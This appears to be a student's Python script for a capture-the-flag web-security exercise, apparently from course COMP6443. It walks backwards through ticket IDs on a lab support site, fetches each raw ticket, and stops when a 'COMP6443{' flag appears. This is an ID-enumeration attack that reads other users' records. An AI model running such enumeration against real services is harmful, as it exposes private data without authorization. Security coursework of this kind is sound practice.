import requests

# Set up the base URL for the tickets
base_url = "https://support-v0.quoccacorp.com/raw/"

# Define the range of ticket IDs you want to loop through
start_id = 1163  # The starting ticket ID (replace with your initial ticket ID)
end_id = 1       # The ending ticket ID (adjust this as needed)
increment = -1    # Decrement the ticket ID

# Loop through the ticket IDs
for ticket_id in range(start_id, end_id + increment, increment):
    url = base_url + str(ticket_id)
    
    # Send GET request to the ticket page
    response = requests.get(url)

    # Check the status code to ensure the ticket was retrieved successfully
    if response.status_code == 200:
        print(f"Ticket ID {ticket_id}: Found! Checking response...")
        
        # Check if the flag is in the response text (adjust flag format as needed)
        if "COMP6443{" in response.text:
            print(f"Flag found in Ticket {ticket_id}:")
            print(response.text)
            break
    else:
        print(f"Ticket ID {ticket_id}: No valid ticket (status code {response.status_code})")
        
print("Finished checking tickets.")